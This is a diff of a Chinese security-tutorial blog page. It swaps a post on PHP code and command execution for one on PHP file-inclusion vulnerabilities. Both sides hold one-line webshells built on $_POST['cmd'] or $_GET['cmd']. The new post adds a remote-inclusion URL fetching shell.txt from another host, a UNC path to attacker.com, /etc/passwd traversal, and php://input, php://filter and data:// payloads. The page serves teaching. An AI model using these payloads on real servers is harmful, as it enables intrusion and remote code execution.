@@ -17,18 +17,18 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>php命令执行 - 我的博客</title>
+  <title>php文件包含 - 我的博客</title>
 
   
-    <meta name="description" content="PHP代码执行函数1. eval1eval ( string $code )  把字符串 code 作为PHP代码执行 示例： 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;  注意：eval() 函数传入的参数必须为PHP代码，即要以分号结尾；函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供的、未经">
+    <meta name="description" content="文件包含漏洞 一、核心原理文件包含漏洞本质： 1用户输入 → 被 include()&#x2F;require() 使用 → 可控执行  通俗来说，其实就是程序员在 web 开发时候使用了include()这样的函数去加载资源，在实际使用的时候由用户传入参数，但是没有对参数进行校验、过滤，直接使用用户传入的参数，导致被传入恶意参数，一般可能伴随目录穿越的风险 举个例子：正常逻辑：你去图书馆借书，只允许你借阅">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php命令执行">
-<meta property="og:url" content="http://example.com/2026/03/20/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+<meta property="og:title" content="php文件包含">
+<meta property="og:url" content="http://example.com/2026/03/29/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
 <meta property="og:site_name" content="我的博客">
-<meta property="og:description" content="PHP代码执行函数1. eval1eval ( string $code )  把字符串 code 作为PHP代码执行 示例： 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;  注意：eval() 函数传入的参数必须为PHP代码，即要以分号结尾；函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供的、未经">
+<meta property="og:description" content="文件包含漏洞 一、核心原理文件包含漏洞本质： 1用户输入 → 被 include()&#x2F;require() 使用 → 可控执行  通俗来说，其实就是程序员在 web 开发时候使用了include()这样的函数去加载资源，在实际使用的时候由用户传入参数，但是没有对参数进行校验、过滤，直接使用用户传入的参数，导致被传入恶意参数，一般可能伴随目录穿越的风险 举个例子：正常逻辑：你去图书馆借书，只允许你借阅">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-03-20T14:32:19.000Z">
-<meta property="article:modified_time" content="2026-03-22T14:37:36.278Z">
+<meta property="article:published_time" content="2026-03-29T13:23:35.000Z">
+<meta property="article:modified_time" content="2026-03-29T13:34:27.843Z">
 <meta property="article:author" content="Eleven-hacker">
 <meta name="twitter:card" content="summary">
   
@@ -46,7 +46,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Eleven-hacker","sameAs":[]},"dateCreated":"2026-03-20T22:32:19+08:00","dateModified":"2026-03-22T22:37:36+08:00","datePublished":"2026-03-20T22:32:19+08:00","description":"","headline":"php命令执行","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/03/20/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},"publisher":{"@type":"Organization","name":"Eleven-hacker","sameAs":[]},"url":"http://example.com/2026/03/20/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","image":[]}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Eleven-hacker","sameAs":[]},"dateCreated":"2026-03-29T21:23:35+08:00","dateModified":"2026-03-29T21:34:27+08:00","datePublished":"2026-03-29T21:23:35+08:00","description":"","headline":"php文件包含","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/03/29/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},"publisher":{"@type":"Organization","name":"Eleven-hacker","sameAs":[]},"url":"http://example.com/2026/03/29/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","image":[]}</script>
   
 </head>
 <body>
@@ -65,7 +65,7 @@
 
 
 
-<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2025/03/20/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">php反序列化</span></a><a class="item title" href="/2026/03/20/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span class="title">php命令执行</span></a><a class="item title" href="/2026/03/17/sql%E6%B3%A8%E5%85%A5/"><span class="title">sql注入</span></a><a class="item title" href="/2026/02/01/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">mysql学习笔记</span></a><a class="item title" href="/2025/12/21/Mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20(2)/"><span class="title">Mysql学习笔记（2）</span></a><a class="item title" href="/2025/12/21/test/"><span class="title">test</span></a><a class="item title" href="/2025/12/26/PHP/"><span class="title">PHP</span></a><a class="item title" href="/2025/12/08/hello-world/"><span class="title">Hello World</span></a></div></widget>
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/29/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span class="title">php命令执行</span></a><a class="item title" href="/2026/03/29/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">php文件包含</span></a><a class="item title" href="/2026/03/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">php反序列化</span></a><a class="item title" href="/2026/03/17/sql%E6%B3%A8%E5%85%A5/"><span class="title">sql注入</span></a><a class="item title" href="/2026/02/01/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">mysql学习笔记</span></a><a class="item title" href="/2025/12/21/Mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20(2)/"><span class="title">Mysql学习笔记（2）</span></a><a class="item title" href="/2025/12/21/test/"><span class="title">test</span></a><a class="item title" href="/2025/12/26/PHP/"><span class="title">PHP</span></a><a class="item title" href="/2025/12/08/hello-world/"><span class="title">Hello World</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -78,105 +78,174 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-03-20T14:32:19.000Z">2026-03-20</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-03-22T14:37:36.278Z">2026-03-22</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-03-29T13:23:35.000Z">2026-03-29</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-03-29T13:34:27.843Z">2026-03-29</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>php命令执行</span></h1>
+        <h1 class="text title"><span>php文件包含</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><h1 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h1><h2 id="1-eval"><a href="#1-eval" class="headerlink" title="1. eval"></a>1. eval</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval ( string $code )</span><br></pre></td></tr></table></figure>
+  </div><article class="md-text content"><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><hr>
+<h3 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h3><p>文件包含漏洞本质：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → 被 include()/require() 使用 → 可控执行</span><br></pre></td></tr></table></figure>
 
-<p><strong>把字符串</strong> <strong>code</strong> <strong>作为<strong><strong>PHP</strong></strong>代码执行</strong></p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>通俗来说，其实就是程序员在 web 开发时候使用了<code>include()</code>这样的函数去加载资源，在实际使用的时候由用户传入参数，但是没有对参数进行校验、过滤，直接使用用户传入的参数，导致被传入恶意参数，一般可能伴随目录穿越的风险</p>
+<h4 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h4><p><strong>正常逻辑</strong>：你去图书馆借书，只允许你借阅文学区的书，管理员问你要什么书？你说：《西游记》，管理员判断你的要求符合规则，于是就去文学区找出来给你</p>
+<p><strong>错误逻辑</strong>：管理员没有对读者的要求进行校验，说什么就执行什么，于是你突发奇想说：我要<code>文学区/../../密码箱/图书馆密码</code>,然后管理员就真的照做了</p>
+<p>典型漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];  <span class="comment">#这里接收用户传进来的参数</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">#不校验直接尝试包含这个文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>注意：</strong>eval() 函数传入的参数必须为PHP代码，即要以分号结尾；函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供的、未经完整验证过的数据 。</p>
-<h2 id="2-assert"><a href="#2-assert" class="headerlink" title="2. assert"></a>2. assert</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] )</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="二、远程文件包含（RFI）"><a href="#二、远程文件包含（RFI）" class="headerlink" title="二、远程文件包含（RFI）"></a>二、远程文件包含（RFI）</h3><p>实际上就是可以访问其他服务器上的文件，比如你在京东的网站上（假设有文件包含漏洞）去访问淘宝上的图片，或者去访问你提前部署在自己电脑上的木马文件</p>
+<h4 id="成功条件"><a href="#成功条件" class="headerlink" title="成功条件"></a>成功条件</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span>  <span class="comment">#php.ini</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>如果</strong> <strong>assertion</strong> <strong>是字符串，它将会被</strong> <strong>assert()</strong> <strong>当做</strong> <strong>PHP</strong> <strong>代码来执行。</strong></p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @assert($_POST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jd.com/index.php?file=http://taobao.com/shell.txt</span><br></pre></td></tr></table></figure>
 
-<p><strong>注意</strong>：assert()函数是直接讲传入的参数当成PHP代码执行，不需要以分号结尾</p>
-<h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3. preg_replace"></a>3. preg_replace</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure>
+<p>shell.txt：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>执行一个正则表达式的搜索和替换，搜索</strong> <strong>subject</strong> <strong>中匹配</strong> <strong>pattern 的部分， 以replacement</strong> <strong>进行替换。</strong></p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;just test&quot;);</span><br><span class="line">//preg_replace(&#x27;正则规则&#x27;,&#x27;替换字符&#x27;，&#x27;目标字符&#x27;)</span><br><span class="line">//PCRE修饰符 e ：preg_replace()在进行了对替换字符串的后向引用替换之后, </span><br><span class="line">//将替换后的字符串作为php代码评估执行(eval函数方式), 并使用执行结果作为实</span><br><span class="line">际参与替换的字符串。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>由于在访问时服务器会以php形式解析文件（include()函数特性，会解析php代码），所以你相当于成功写入webshell</p>
+<h4 id="验证方法"><a href="#验证方法" class="headerlink" title="验证方法"></a>验证方法</h4><ol>
+<li>替换为自己服务器</li>
+<li>用 Burp &#x2F; DNSLog 看是否有请求</li>
+</ol>
+<p><strong>UNC路径</strong></p>
+<p>严格来说利用UNC路径也是远程文件包含的一种方式，但两者存在本质上的区别</p>
+<ul>
+<li><strong>远程文件包含（RFI）</strong> 需要php配置开启<strong>allow_url_fopen（允许访问远程文件）</strong>，而<strong>UNC</strong> 本质上属于本地文件系统，不受php配置影响</li>
+<li><strong>远程文件包含（RFI）</strong> 使用的是<strong>HTTP&#x2F;HTTPS（80&#x2F;443端口）</strong> 协议，在日志中很扎眼，而<strong>UNC</strong> 使用的是<strong>SMB（445端口）</strong> 协议，只有禁用了445端口才能拦截</li>
+</ul>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim.com/index.php?file=\\\\attacker.com\\share\\test.php</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4. create_function"></a>4. create_function</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function( string $args , string $code )</span><br></pre></td></tr></table></figure>
+<p>详细关于<strong>UNC</strong> 介绍参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Noimpty_/article/details/159352148?fromshare=blogdetail&sharetype=blogdetail&sharerId=159352148&sharerefer=PC&sharesource=Noimpty_&sharefrom=from_link">DNSlog盲注</a></p>
+<hr>
+<h3 id="三、本地文件包含（LFI）"><a href="#三、本地文件包含（LFI）" class="headerlink" title="三、本地文件包含（LFI）"></a>三、本地文件包含（LFI）</h3><p>访问服务器本地的文件，一样的道理，只是利用手段更多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><strong>从传递的参数创建一个匿名函数，并为其返回唯一的名称。</strong></p>
-<p>通常这些参数将作为单引号分隔的字符串传递。使用单引号的原因是为了保护变量名不被解析，否则，如果使用双引号，就需要转义变量名，例如$avar</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$func = create_function(&#x27;&#x27;,$_POST[&#x27;cmd&#x27;]);$func();</span><br><span class="line">//创建匿名函数执行代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>用途：</p>
+<ul>
+<li>读配置</li>
+<li>读源码</li>
+<li>配合日志投毒RCE（后面会提到）</li>
+</ul>
+<hr>
+<h3 id="四、PHP伪协议"><a href="#四、PHP伪协议" class="headerlink" title="四、PHP伪协议"></a>四、PHP伪协议</h3><p><strong>php伪协议通俗来说就是php自己定义的读取文件的一种方式</strong></p>
+<h4 id="1-file"><a href="#1-file" class="headerlink" title="1. file:&#x2F;&#x2F;"></a>1. file:&#x2F;&#x2F;</h4><p><strong>用来读取本地文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:///etc/passwd</span><br></pre></td></tr></table></figure>
 
-<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5. call_user_func"></a>5. call_user_func</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</span><br></pre></td></tr></table></figure>
+<p>这里使用了三个<code>/</code>的原因是因为<code>file://</code>的实际结构应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file://本地IP（主机）/文件路径       #主机为空表示localhost</span><br></pre></td></tr></table></figure>
 
-<p><strong>把第一个参数作为回调函数调用。</strong></p>
-<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func(&quot;assert&quot;,$_POST[&#x27;cmd&#x27;]);</span><br><span class="line">//传入的参数作为assert函数的参数</span><br><span class="line">//cmd=system(whoami)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>特点：</p>
+<ul>
+<li>不受配置影响</li>
+<li>只能绝对路径</li>
+<li>读取文件内容（不一定执行）</li>
+</ul>
+<p>如果<strong>shell.txt</strong>文件内容是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>
 
-<h1 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令，让后台进行执行，从而获得后台服务器权限。</p>
-<h1 id="PHP系统命令执行函数"><a href="#PHP系统命令执行函数" class="headerlink" title="PHP系统命令执行函数"></a>PHP系统命令执行函数</h1><p>利用PHP 的系统命令执行函数来调用系统命令并执行，这类函数有 system()、exec()、shell_exec()、passthru()、penti_exec()、popen()、proc_pen()等，此外还有反引号命令执行，这种方式实际上是调用 shell_exec()函数来执行。</p>
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:///example/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果后端使用了<strong>include()<strong>包含文件，会解析</strong>php</strong>代码，写入<strong>webshell</strong></p>
+<p>如果没有使用，不会解析代码，只会在页面展示文件内容<code>&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;</code></p>
 <blockquote>
-<p>**system()**：执行外部程序，并且显示输出；</p>
-<p>**exec()**：执行一个外部程序</p>
-<p>**shell_exec()**：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
-<p>**passthru()**：执行unix系统命令并且显示原始输出</p>
-<p>**pcntl_exec()**：在当前进程空间执行指定程序</p>
-<p>**popen()**：打开进程文件指针</p>
-<p>**proc_open()**：执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p>
+<p><strong>注意：会解析代码的前提一定是后端使用了类似include()函数去包含文件</strong></p>
 </blockquote>
-<p>PHP提供4个专门的执行外部命令的函数：</p>
-<p><strong>exec()</strong></p>
-<p><strong>system()</strong></p>
-<p><strong>passthru()</strong></p>
-<p><strong>shell_exec()</strong></p>
-<h2 id="1-exec"><a href="#1-exec" class="headerlink" title="1. exec"></a>1. exec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2. php:&#x2F;&#x2F;filter"></a>2. php:&#x2F;&#x2F;filter</h4><p><strong>用来单纯读取文件，不解析</strong></p>
+<p>刚刚说到如果后端使用了类似 <strong>include()</strong> 去包含文件，那文件会被解析，有时候我们只需要读取文件内容而不希望解析，比如说 <strong>.php</strong>文件，所以<strong>filter</strong>的思路就是先将文件转换成<strong>base64</strong>编码，这样就不会被解析，只会被展示在前端，再利用工具将展示出来的<strong>base</strong>编码转回原文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php    #index.php是文件名</span><br></pre></td></tr></table></figure>
 
-<p><strong>执行一个外部程序，exec() 执行</strong> <strong>command</strong> <strong>参数所指定的命令。</strong></p>
-<p>exec执行系统外部命令时不会输出结果，而是返回结果的最后一行。如果想得到结果，可以使用第二个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。即如果输出结果有20行，则这个数组就有20条记录，所以如果需要反复输出调用不同系统外部命令的结果，最好在输出每一条系统外部命令结果时清空这个数组unset($output) ，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="line">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="line">// echo exec(&#x27;whoami&#x27;);</span><br><span class="line">// exec(&#x27;ls -la&#x27;, $return);</span><br><span class="line">// var_dump($return);</span><br><span class="line">$cmd=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">@exec($cmd, $return);</span><br><span class="line">var_dump($return)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="3-php-input"><a href="#3-php-input" class="headerlink" title="3. php:&#x2F;&#x2F;input"></a>3. php:&#x2F;&#x2F;input</h4><p><strong>原理是input可以拿到原始数据</strong></p>
+<p>条件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
 
-<h2 id="2-system"><a href="#2-system" class="headerlink" title="2. system"></a>2. system</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
+<p>这里涉及到处理POST表单的两种方式，**$_POST和php:&#x2F;&#x2F;input**</p>
+<p>例如前端发送表单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456</span><br></pre></td></tr></table></figure>
 
-<p><strong>函数执行</strong> <strong>command</strong> <strong>参数所指定的命令， 并且输出执行结果。</strong></p>
-<p>system和exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span><br><span class="line">// 并且将输出的最后一样内容返回到 $last_line。</span><br><span class="line">// 将命令的返回值保存到 $retval。</span><br><span class="line">$last_line = system(&#x27;ls&#x27;, $retval);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>$_POST</strong>实际上是以键值对的形式处理好了</p>
+<p>如果用 <strong>print_r($_POST)</strong> 你看到的大概是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Array (</span><br><span class="line">  [username] =&gt; admin</span><br><span class="line">  [password] =&gt; 123456</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 
-<h2 id="3-passthru"><a href="#3-passthru" class="headerlink" title="3. passthru"></a>3. passthru</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
+<p><strong>php:&#x2F;&#x2F;input</strong>处理的还是原始数据</p>
+<p>用 <strong>echo file_get_contents(“php:&#x2F;&#x2F;input”);</strong> 看到的还是</p>
+<p><code>username=admin&amp;password=123456</code></p>
+<p>所以使用php:&#x2F;&#x2F;input时纂改post数据包</p>
+<p>请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?file=php://input</span><br></pre></td></tr></table></figure>
 
-<p><strong>执行外部程序并且显示原始输出</strong></p>
-<p>同exec()函数类似，passthru() 函数 也是用来执行外部命令（command）的，如果要获取一个命令未经任何处理的原始输出， 请使用 passthru() 函数。</p>
-<p>当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。</p>
-<p>passthru与system的区别：passthru直接将结果输出到浏览器，不返回任何值，且其可以输出二进制，比如图像数据。第二个参数可选，是状态码。</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = passthru(&quot;ls -la&quot;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>Body：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="4-shell-exec"><a href="#4-shell-exec" class="headerlink" title="4. shell_exec"></a>4. shell_exec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec ( string $cmd ) </span><br></pre></td></tr></table></figure>
+<p>就可以在<strong>include()</strong> 包含时解析php代码,而 <strong>$_POST</strong> 无法达到这种效果就是因为它已经将数据处理成键值对了</p>
+<blockquote>
+<p><strong>所以 include() 和 php:&#x2F;&#x2F;input 同时出现是非常危险的</strong></p>
+</blockquote>
+<p>但有时候却必须使用<strong>php:&#x2F;&#x2F;input</strong>,比如说前端传输的数据是json格式时</p>
+<hr>
+<h4 id="4-data"><a href="#4-data" class="headerlink" title="4. data :&#x2F;&#x2F;"></a>4. data :&#x2F;&#x2F;</h4><p>这种的原理和<strong>php:&#x2F;&#x2F;filter</strong>差不多，<strong>data:&#x2F;&#x2F;</strong> 不是去读取文件而是允许你直接在<strong>URL</strong>中插入一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ </span><br></pre></td></tr></table></figure>
 
-<p><strong>通过</strong> <strong>shell</strong> <strong>环境执行命令，并且将完整的输出以字符串的方式返回。</strong></p>
-<p>本函数同 <strong>执行操作符（</strong>**&#96;**<strong>）。</strong></p>
-<p><strong>示例:</strong></p>
